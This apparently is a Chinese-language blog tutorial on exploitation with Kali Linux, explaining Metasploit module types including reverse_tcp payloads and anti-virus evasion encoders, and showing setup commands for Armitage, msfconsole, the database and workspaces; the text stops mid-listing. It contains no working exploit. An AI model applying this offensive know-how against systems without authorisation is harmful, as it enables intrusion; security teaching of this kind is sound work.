<!DOCTYPE html><html class="theme-next gemini use-motion" lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script><link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet"><script></script><meta name="theme-color" content="#222"><style>.pace .pace-progress{background:#1e92fb;height:3px}.pace .pace-progress-inner{box-shadow:0 0 10px #1e92fb,0 0 5px #1e92fb}.pace .pace-activity{border-top-color:#1e92fb;border-left-color:#1e92fb}</style><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css"><link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css"><link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4"><link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4"><link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4"><link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222"><meta name="keywords" content="渗透测试,漏洞利用,"><link rel="alternate" href="/atom.xml" title="凡间的精灵" type="application/atom+xml"><meta name="description" content="漏洞利用漏洞利用是利用程序中的某些漏洞得到计算机的控制权。通过漏洞扫描，可以从目标系统中找到容易攻击的漏洞。然后，利用该漏洞获取权限，从而实现对目标系统的控制。Kali Linux提供了大量的漏洞利用工具。其中，较知名的是Metasploit渗透测试框架。一、Metasploit概述Metasploit是一款开源的安全漏洞检测工具。它可以帮助网络安全和IT专业人士识别安全性问题，验证漏洞的解决措施"><meta name="keywords" content="渗透测试,漏洞利用"><meta property="og:type" content="article"><meta property="og:title" content="漏洞利用"><meta property="og:url" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2020&#x2F;12&#x2F;23&#x2F;kali-lou-dong-li-yong&#x2F;index.html"><meta property="og:site_name" content="凡间的精灵"><meta property="og:description" content="漏洞利用漏洞利用是利用程序中的某些漏洞得到计算机的控制权。通过漏洞扫描，可以从目标系统中找到容易攻击的漏洞。然后，利用该漏洞获取权限，从而实现对目标系统的控制。Kali Linux提供了大量的漏洞利用工具。其中，较知名的是Metasploit渗透测试框架。一、Metasploit概述Metasploit是一款开源的安全漏洞检测工具。它可以帮助网络安全和IT专业人士识别安全性问题，验证漏洞的解决措施"><meta property="og:locale" content="zh-Hans"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2020&#x2F;12&#x2F;23&#x2F;kali-lou-dong-li-yong&#x2F;%E5%9B%BE%E7%89%871.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2020&#x2F;12&#x2F;23&#x2F;kali-lou-dong-li-yong&#x2F;%E5%9B%BE%E7%89%872.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2020&#x2F;12&#x2F;23&#x2F;kali-lou-dong-li-yong&#x2F;%E5%9B%BE%E7%89%873.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2020&#x2F;12&#x2F;23&#x2F;kali-lou-dong-li-yong&#x2F;%E5%9B%BE%E7%89%874.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2020&#x2F;12&#x2F;23&#x2F;kali-lou-dong-li-yong&#x2F;%E5%9B%BE%E7%89%875.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2020&#x2F;12&#x2F;23&#x2F;kali-lou-dong-li-yong&#x2F;%E5%9B%BE%E7%89%876.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2020&#x2F;12&#x2F;23&#x2F;kali-lou-dong-li-yong&#x2F;%E5%9B%BE%E7%89%877.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2020&#x2F;12&#x2F;23&#x2F;kali-lou-dong-li-yong&#x2F;%E5%9B%BE%E7%89%878.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2020&#x2F;12&#x2F;23&#x2F;kali-lou-dong-li-yong&#x2F;%E5%9B%BE%E7%89%879.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2020&#x2F;12&#x2F;23&#x2F;kali-lou-dong-li-yong&#x2F;%E5%9B%BE%E7%89%8710.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2020&#x2F;12&#x2F;23&#x2F;kali-lou-dong-li-yong&#x2F;%E5%9B%BE%E7%89%8711.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2020&#x2F;12&#x2F;23&#x2F;kali-lou-dong-li-yong&#x2F;%E5%9B%BE%E7%89%8712.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2020&#x2F;12&#x2F;23&#x2F;kali-lou-dong-li-yong&#x2F;%E5%9B%BE%E7%89%8713.png"><meta property="og:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2020&#x2F;12&#x2F;23&#x2F;kali-lou-dong-li-yong&#x2F;%E5%9B%BE%E7%89%8715.png"><meta property="og:updated_time" content="2020-12-28T06:57:51.532Z"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="http:&#x2F;&#x2F;chenzhonzhou.github.io&#x2F;2020&#x2F;12&#x2F;23&#x2F;kali-lou-dong-li-yong&#x2F;%E5%9B%BE%E7%89%871.png"><script type="text/javascript" id="hexo.configurations">var NexT=window.NexT||{},CONFIG={root:"/",scheme:"Gemini",version:"5.1.4",sidebar:{position:"left",display:"always",offset:12,b2t:!0,scrollpercent:!0,onmobile:!0},fancybox:!0,tabs:!0,motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"slideDownIn",post_body:"slideDownIn",coll_header:"slideLeftIn",sidebar:"slideUpIn"}},duoshuo:{userId:"0",author:"博主"},algolia:{applicationID:"",apiKey:"",indexName:"",hits:{per_page:10},labels:{input_placeholder:"Search for Posts",hits_empty:"We didn't find any results for the search: ${query}",hits_stats:"${hits} results found in ${time} ms"}}}</script><link rel="canonical" href="http://chenzhonzhou.github.io/2020/12/23/kali-lou-dong-li-yong/"><title>漏洞利用 | 凡间的精灵</title><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head><body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans"><div class="container sidebar-position-left page-post-detail"><div class="headband"></div><header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-wrapper"><div class="site-meta"><div class="custom-logo-site-title"><a href="/" class="brand" rel="start"><span class="logo-line-before"><i></i></span> <span class="site-title">凡间的精灵</span><span class="logo-line-after"><i></i></span></a></div><p class="site-subtitle">凡尘落素一精灵</p></div><div class="site-nav-toggle"><button><span class="btn-bar"></span><span class="btn-bar"></span><span class="btn-bar"></span></button></div></div><nav class="site-nav"><ul id="menu" class="menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i><br>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives" rel="section"><i class="menu-item-icon fa fa-fw fa-question-circle"></i><br>归档</a></li><li class="menu-item menu-item-categories"><a href="/categories" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i><br>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i><br>标签</a></li><li class="menu-item menu-item-about"><a href="/about" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i><br>关于</a></li><li class="menu-item menu-item-search"><a href="javascript:;" class="popup-trigger"><i class="menu-item-icon fa fa-search fa-fw"></i><br>搜索</a></li></ul><div class="site-search"><div class="popup search-popup local-search-popup"><div class="local-search-header clearfix"><span class="search-icon"><i class="fa fa-search"></i></span><span class="popup-btn-close"><i class="fa fa-times-circle"></i></span><div class="local-search-input-wrapper"><input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input"></div></div><div id="local-search-result"></div></div></div></nav></div></header><main id="main" class="main"><div class="main-inner"><div class="content-wrap"><div id="content" class="content"><div id="posts" class="posts-expand"><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="http://chenzhonzhou.github.io/2020/12/23/kali-lou-dong-li-yong/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="Zhongzhou Chen"><meta itemprop="description" content=""><meta itemprop="image" content="/images/chen.png"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="凡间的精灵"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">漏洞利用</h1><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i></span> <span class="post-meta-item-text">发表于</span> <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-12-23T18:15:11+08:00">2020-12-23</time></span> <span class="post-category"><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-folder-o"></i></span> <span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a></span></span><div class="post-wordcount"><span class="post-meta-item-icon"><i class="fa fa-file-word-o"></i></span> <span class="post-meta-item-text">字数统计&#58;</span> <span title="字数统计">20.9k</span> <span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-clock-o"></i></span> <span class="post-meta-item-text">阅读时长 &asymp;</span> <span title="阅读时长">92</span></div></div></header><div class="post-body" itemprop="articleBody"><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>漏洞利用是利用程序中的某些漏洞得到计算机的控制权。通过漏洞扫描，可以从目标系统中找到容易攻击的漏洞。然后，利用该漏洞获取权限，从而实现对目标系统的控制。Kali Linux提供了大量的漏洞利用工具。其中，较知名的是Metasploit渗透测试框架。</p><h2 id="一、Metasploit概述"><a href="#一、Metasploit概述" class="headerlink" title="一、Metasploit概述"></a>一、Metasploit概述</h2><p>Metasploit是一款开源的安全漏洞检测工具。它可以帮助网络安全和IT专业人士识别安全性问题，验证漏洞的解决措施，从而完成对目标的安全性评估。该工具囊括了智能开发、代码审计、Web应用程序扫描和社会工程等各项功能。本节将介绍Metasploit的相关概念。</p><h3 id="1-1-什么是Metasploit"><a href="#1-1-什么是Metasploit" class="headerlink" title="1.1 什么是Metasploit"></a>1.1 什么是Metasploit</h3><p>Metasploit是一个免费的、可下载的框架。通过它，网络安全人员可以很容易地获取、挖掘计算机软件漏洞，并对其实施攻击。Metasploit框架可以用来发现漏洞、利用漏洞、提交漏洞，并实施攻击。而且，用户可以从其他漏洞扫描程序导入数据，基于漏洞主机的详细信息来发现可攻击漏洞，从而使用有效载荷对系统发起攻击。<br>Metasploit框架的强大之处就是提供了大量的渗透测试模块和插件。这些模块按照不同用途可以分为7种类型，分别是Exploits（渗透攻击模块）、Auxiliary（辅助模块）、Post（后渗透攻击模块）、Payloads（攻击载荷模块）、Encoders（编码器模块）、Nops（空指令模块）和Evasion（规避模块）。下面分别介绍这7种模块和插件的作用。</p><h4 id="1-1-1-渗透攻击模块"><a href="#1-1-1-渗透攻击模块" class="headerlink" title="1.1.1 渗透攻击模块"></a>1.1.1 渗透攻击模块</h4><p>渗透攻击模块主要利用发现的安全漏洞或配置弱点对目标系统进行攻击，以植入和运行攻击载荷，从而获得目标系统的访问控制权。Metasploit框架中的渗透攻击模块可以按照安全漏洞所在的位置，分为主动渗透攻击与被动渗透攻击两大类。其中，这两种攻击类型的区别如下所述。</p><ul><li><p>主动渗透攻击：利用的安全漏洞位于网络服务端软件与服务端软件承载的上层应用程序之中。由于这些服务通常是在主机上开启一些监听端口，并等待客户端连接。通过连接目标系统网络服务，注入一些特殊构造的包含“恶意”攻击数据的网络请求内容，触发安全漏洞，并使得远程服务器执行“恶意”数据中包含的攻击载荷，从而获取目标系统的控制权限。</p></li><li><p>被动渗透攻击：利用的漏洞位于客户端软件（如浏览器、浏览器插件、电子邮件客户端、Office与Adobe等各种文档与编辑软件）。对于这类安全漏洞，渗透测试者无法主动地将数据从远程输入到客户端软件中，因此只能采用被动渗透攻击方式。通常使用的被动渗透攻击方式有构造“恶意”的网页、电子邮件或文档文件，并通过架设包含此类恶意内容的服务端、发送邮件附件、结合社会工程学攻击分发、结合网络欺骗和劫持技术等，诱骗目标用户打开或访问目标系统上的这些恶意内容，从而触发客户端软件中的安全漏洞，以获取控制目标系统的Shell会话。</p></li></ul><h4 id="1-1-2-辅助模块"><a href="#1-1-2-辅助模块" class="headerlink" title="1.1.2 辅助模块"></a>1.1.2 辅助模块</h4><p>辅助模块包括针对各种网络服务的扫描与检测，构建虚假服务收集登录密码、口令猜测等模块。另外，辅助模块中还包括一些无须加载的攻击载荷，这些模块不用来取得目标系统远程控制权，如拒绝服务攻击。</p><h4 id="1-1-3-后渗透攻击模块"><a href="#1-1-3-后渗透攻击模块" class="headerlink" title="1.1.3 后渗透攻击模块"></a>1.1.3 后渗透攻击模块</h4><p>后渗透攻击模块主要用于取得目标系统远程控制权之后的环节，实现在受控制系统中进行各种各样的后渗透攻击动作，如获取敏感信息、进一步拓展、实施跳板攻击等。</p><h4 id="1-1-4-攻击载荷模块"><a href="#1-1-4-攻击载荷模块" class="headerlink" title="1.1.4 攻击载荷模块"></a>1.1.4 攻击载荷模块</h4><p>攻击载荷是在渗透攻击成功后促使目标系统运行的一段植入代码。通常作用是为渗透攻击者打开在目标系统上的控制会话连接。在传统的渗透代码开发中，攻击载荷只是一段简单的ShellCode代码，以汇编语言编制并转换为目标系统CPU体系结构支持的机器代码。在渗透攻击触发漏洞后，将程序执行流程劫持并跳转入这段代码中执行，从而完成ShellCode中的单一功能。</p><p>Metasploit攻击载荷分为Single（独立）、Stager（传输器）和Stage（传输体）3种类型。这3种攻击载荷类型的区别如下所述。</p><ul><li>Single：是一种完全独立的Payload，而且使用起来就像运行calc.exe一样简单，如添加一个系统用户或删除一份文件。由于Single Payload是完全独立的，因此它们有可能会被类似netcat这样的非Metasploit处理工具所捕获。</li><li>Stager：这种Payload负责建立目标用户与攻击者之间的网络连接，并下载额外的组件或应用程序。一种常见的Stager Payload就是reverse_tcp，它可以让目标系统与攻击者建立一条TCP连接，让目标系统主动连接渗透测试者的端口（反向连接）。另一种常见的是bind_tcp，它可以让目标系统开启一个TCP监听器，而攻击者随时可以与目标系统进行通信（正向连接）。</li><li>Stage：是Stager Payload下的一种Payload组件，这种Payload可以提供更加高级的功能，而且没有大小限制。</li></ul><h4 id="1-1-5-空指令模块"><a href="#1-1-5-空指令模块" class="headerlink" title="1.1.5 空指令模块"></a>1.1.5 空指令模块</h4><p>空指令（NOP）是一些对程序运行状态不会造成任何实质影响的空操作或无关操作指令，最典型的空指令就是空操作，在X86 CPU体系结构平台上的操作码是ox90。</p><p>在渗透攻击构造恶意数据缓冲区时，常常要在真正要执行的Shellcode之前添加一段空指令区。这样，当触发渗透攻击后跳转执行ShellCode时，会有一个较大的安全着陆区，从而避免受到内存地址随机化及返回地址计算偏差等原因造成的ShellCode执行失败，提供渗透攻击的可靠性。</p><h4 id="1-1-6-编码模块"><a href="#1-1-6-编码模块" class="headerlink" title="1.1.6 编码模块"></a>1.1.6 编码模块</h4><p>攻击载荷与空指令模块组装完成一个指令序列后，在这段指令被渗透攻击模块加入恶意数据缓冲区交由目标系统运行之前，Metasploit框架还需要进行编码。编码模块的主要作用有两个：第一，是确保攻击载荷中不会出现“坏字符”；第二，是对攻击载荷进行“免杀”处理，即躲避反病毒软件、IDS入侵检测系统和IPS入侵防御系统的检测与拦截。</p><h4 id="1-1-7-规避模块"><a href="#1-1-7-规避模块" class="headerlink" title="1.1.7 规避模块"></a>1.1.7 规避模块</h4><p>规避模块是在Metasploit 5中新增加的。用户可以使用规避模块来规避Windows Defender防火墙。Windows Defender现在是Windows系统自带的防火墙工具。它不仅可以扫描系统，还可以对系统进行实时监控。</p><h4 id="1-1-8-插件"><a href="#1-1-8-插件" class="headerlink" title="1.1.8 插件"></a>1.1.8 插件</h4><p>插件能够扩充框架的功能，或者封装已有功能构成高级功能的组件。插件可以用于集成现有的一些外部安全工具，如Nessus、OpenVAS漏洞扫描器等。</p><h3 id="1-2-Metasploit界面"><a href="#1-2-Metasploit界面" class="headerlink" title="1.2 Metasploit界面"></a>1.2 Metasploit界面</h3><p>Metasploit框架提供了两种界面，分别是图形界面和终端模式。之前，还提供了一种命令行模式的界面，但是已经废弃。这里分别介绍Metasploit的图形界面和终端模式启动方法。</p><h4 id="1-2-1-Metasploit的图形界面Armitage"><a href="#1-2-1-Metasploit的图形界面Armitage" class="headerlink" title="1.2.1 Metasploit的图形界面Armitage"></a>1.2.1 Metasploit的图形界面Armitage</h4><p>Armitage是一款由Java编写的Metasploit图形界面化的攻击软件。它可以结合Metasploit中已知的exploit，对主机存在的漏洞进行自动化攻击。下面将介绍Armitage的使用方法。</p><p>启动Armitage工具。具体操作步骤如下：exploit</p><ol><li><p>在图形界面依次选择“应用程序”|“漏洞利用工具集”|armitage命令，即可启动Armitage工具，如下图所示。<br>没有这个工具的话，使用<code>sudo apt install armitage</code>命令安装。</p><p><img src="/2020/12/23/kali-lou-dong-li-yong/%E5%9B%BE%E7%89%871.png" alt="图片1"></p></li><li><p>该对话框显示了连接Metasploit服务的基本信息。单击Connect按钮，将显示如下图所示的对话框。</p><p><img src="/2020/12/23/kali-lou-dong-li-yong/%E5%9B%BE%E7%89%872.png" alt="图片2"></p></li><li><p>该对话框提示是否要启动Metasploit的RPC服务。单击“是(Y)”按钮，将显示如下图所示的对话框。</p><p><img src="/2020/12/23/kali-lou-dong-li-yong/%E5%9B%BE%E7%89%873.png" alt="图片3"></p></li><li><p>该对话框显示了连接Metasploit的进度。当成功连接到Metasploit服务，将显示如下图所示的界面。</p><p><img src="/2020/12/23/kali-lou-dong-li-yong/%E5%9B%BE%E7%89%874.png" alt="图片4"></p></li><li><p>看到该界面，则表示成功启动了Armitage工具。接下来，用户就可以使用该工具实施渗透测试了。在该界面共包括3个部分，这里把它们分别标记为A、B和C。<br>A部分：显示预配置模块。用户可以在模块列表中使用空格键搜索提供的模块。<br>B部分：显示活跃的目标系统，用户能执行利用漏洞攻击。<br>C部分：显示多个Metasploit标签。这样，就可以运行多个Meterpreter命令或控制台会话，并且同时显示。<br>例如，对目标主机实施Nmap Ping扫描，可依次选择Hosts|Nmap Scan|Ping Scan命令，如下图所示。</p><p><img src="/2020/12/23/kali-lou-dong-li-yong/%E5%9B%BE%E7%89%875.png" alt="图片5"></p></li><li><p>在该界面选择Ping Scan命令后，即可对目标主机实施Ping扫描。</p></li></ol><h4 id="1-2-2-Metasploit的终端Msfconsole"><a href="#1-2-2-Metasploit的终端Msfconsole" class="headerlink" title="1.2.2 Metasploit的终端Msfconsole"></a>1.2.2 Metasploit的终端Msfconsole</h4><p>MSF终端（Msfconsole）是目前Metasploit框架最为流行的用户接口，而且MSF终端是Metasploit框架中最灵活、功能最丰富，以及支持最好的工具之一。MSF终端提供了一站式的接口，能设置Metasploit框架中几乎每一个选项和配置。用户可以使用MSF终端做任何事情，包括发起一次渗透攻击、装载辅助模块、实施查点、创建监听器，或是对整个网络进行自动化渗透攻击等。下面将介绍Metasploit的终端模式。</p><p>启动Metasploit的终端模式。执行命令如下：</p><blockquote><p>msfconsole</p></blockquote><p>执行以上命令后，即可成功启动Metasploit的终端模式。如下所示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># msfconsole        </span></span><br><span class="line">                                                  </span><br><span class="line">  +-------------------------------------------------------+</span><br><span class="line">  |  METASPLOIT by Rapid7                                 |</span><br><span class="line">  +---------------------------+---------------------------+</span><br><span class="line">  |      __________________   |                           |</span><br><span class="line">  |  ==c(______(o(______(_()  | |<span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span>|======[***  |</span><br><span class="line">  |             )=\           | |  EXPLOIT   \            |</span><br><span class="line">  |            // \\          | |_____________\_______    |</span><br><span class="line">  |           //   \\         | |==[msf &gt;]============\   |</span><br><span class="line">  |          //     \\        | |______________________\  |</span><br><span class="line">  |         // RECON \\       | \(@)(@)(@)(@)(@)(@)(@)/   |</span><br><span class="line">  |        //         \\      |  *********************    |</span><br><span class="line">  +---------------------------+---------------------------+</span><br><span class="line">  |      o O o                |        \<span class="string">'\/\/\/'</span>/         |</span><br><span class="line">  |              o O          |         )======(          |</span><br><span class="line">  |                 o         |       .<span class="string">'  LOOT  '</span>.        |</span><br><span class="line">  | |^^^^^^^^^^^^^^|l___      |      /    _||__   \       |</span><br><span class="line">  | |    PAYLOAD     |<span class="string">""</span>\___, |     /    (_||_     \      |</span><br><span class="line">  | |________________|__|)__| |    |     __||_)     |     |</span><br><span class="line">  | |(@)(@)<span class="string">""</span><span class="string">"**|(@)(@)**|(@) |    "</span>       ||       <span class="string">"     |</span></span><br><span class="line"><span class="string">  |  = = = = = = = = = = = =  |     '--------------'      |</span></span><br><span class="line"><span class="string">  +---------------------------+---------------------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       =[ metasploit v6.0.20-dev                          ]</span></span><br><span class="line"><span class="string">+ -- --=[ 2081 exploits - 1125 auxiliary - 354 post       ]</span></span><br><span class="line"><span class="string">+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]</span></span><br><span class="line"><span class="string">+ -- --=[ 7 evasion                                       ]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Metasploit tip: To save all commands executed since start up </span></span><br><span class="line"><span class="string">to a file, use the makerc command</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">msf6 &gt;</span></span><br></pre></td></tr></table></figure><p>看到命令行提示符显示为<code>msf 6&gt;</code>，则表示成功启动了Metasploit的终端模式。从输出的信息可以看到支持的攻击模块及对应的数量。例如，渗透攻击载荷模块有2081个，辅助模块有1125个，后渗透攻击模块有354个，攻击载荷模块有592个，编码模块有45个，空指令模块有10个，规避模块有7个。接下来，用户就可以使用这些攻击载荷实施渗透测试了。</p><h3 id="1-3-初始化Metasploit"><a href="#1-3-初始化Metasploit" class="headerlink" title="1.3 初始化Metasploit"></a>1.3 初始化Metasploit</h3><p>在Kali Linux中，Metasploit主要使用PostgreSQL数据库存储数据。所以，在使用Metasploit框架时，需要启动PostgreSQL数据库。</p><p>执行命令如下：</p><blockquote><p>service postgresql start</p></blockquote><p>另外，启动PostgreSQL数据库之后，还需要使用msfdb init命令创建和初始化数据库。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># msfdb init                                            #初始化数据库</span></span><br><span class="line">[+] Starting database</span><br><span class="line">Creating database user <span class="string">'msf'</span></span><br><span class="line">为新角色输入的口令: </span><br><span class="line">再输入一遍: </span><br><span class="line">Creating databases <span class="string">'msf'</span> and <span class="string">'msf_test'</span></span><br><span class="line">Creating configuration file <span class="keyword">in</span> /usr/share/metasploit-framework/config/</span><br><span class="line">database.yml</span><br><span class="line">Creating initial database s</span><br></pre></td></tr></table></figure><p>从以上输出信息中，可以看到自动创建了msf和msf_test数据库。而且，创建了数据库配置文件database.yml。</p><blockquote><p>如果当前系统已经初始化Metasploit，将提示数据库已经配置。如下：</p></blockquote><blockquote><p>[i] Database already started<br>[i] The database appears to be already configured, skipping initialization</p></blockquote><h3 id="1-4-创建工作区"><a href="#1-4-创建工作区" class="headerlink" title="1.4 创建工作区"></a>1.4 创建工作区</h3><p>为了区分不同的扫描任务，可以创建多个工作区，用来保存不同扫描任务的各种信息。其中，不同工作区之间的信息相互独立，避免数据混淆。</p><p>创建工作区的语法格式如下：</p><blockquote><p>workspace -a [name]</p></blockquote><p>以上语法中，-a选项表示添加工作区。</p><p>创建一个名为test的工作区。具体操作步骤如下：</p><ol><li><p>查看当前所在的工作区。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; workspace</span><br><span class="line">* default</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，默认只有一个default工作区。而且，当前正在使用该工作区。</p></li><li><p>创建新的工作区。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; workspace -a <span class="built_in">test</span></span><br><span class="line">[*] Added workspace: <span class="built_in">test</span></span><br><span class="line">[*] Workspace: <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，成功添加了工作区test。而且，已自动切换到新建的工作区。</p></li><li><p>查看当前的工作区。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; workspace</span><br><span class="line">  default</span><br><span class="line">* <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，目前有两个工作区。其中，test是刚创建的，并且目前正在使用。如果用户想要切换工作区，可以使用workspace [name]命令进行切换。</p></li><li><p>切换工作区。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; workspace default</span><br><span class="line">[*] Workspace: default</span><br><span class="line">msf6 &gt; workspace</span><br><span class="line">  <span class="built_in">test</span></span><br><span class="line">* default</span><br></pre></td></tr></table></figure><p>看到以上输出的信息，则表示成功切换到default工作区。</p></li></ol><h3 id="1-5-导入扫描报告"><a href="#1-5-导入扫描报告" class="headerlink" title="1.5 导入扫描报告"></a>1.5 导入扫描报告</h3><p>当用户准备好工作区后，就可以执行渗透测试任务了。此时，用户可以导入一些第三方扫描报告，来获取主机信息。</p><p>导入扫描报告的语法格式如下：</p><blockquote><p>db_import<filename>[file2…]</filename></p></blockquote><p>以上语法中，参数filename表示导入的文件名。</p><p>导入OpenVAS生成的扫描报告文件openvas.xml。具体操作步骤如下：</p><ol><li><p>用户在导入扫描报告之前，可以查看支持的报告格式。如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; db_import</span><br><span class="line">Usage: db_import &lt;filename&gt; [file2...]</span><br><span class="line"></span><br><span class="line">Filenames can be globs like *.xml, or **/*.xml <span class="built_in">which</span> will search recursively</span><br><span class="line">Currently supported file types include:</span><br><span class="line">    Acunetix</span><br><span class="line">    Amap Log</span><br><span class="line">    Amap Log -m</span><br><span class="line">    Appscan</span><br><span class="line">    Burp Session XML</span><br><span class="line">    Burp Issue XML</span><br><span class="line">    CI</span><br><span class="line">    Foundstone</span><br><span class="line">    FusionVM XML</span><br><span class="line">    Group Policy Preferences Credentials</span><br><span class="line">    IP Address List</span><br><span class="line">    IP360 ASPL</span><br><span class="line">    IP360 XML v3</span><br><span class="line">    Libpcap Packet Capture</span><br><span class="line">    Masscan XML</span><br><span class="line">    Metasploit PWDump Export</span><br><span class="line">    Metasploit XML</span><br><span class="line">    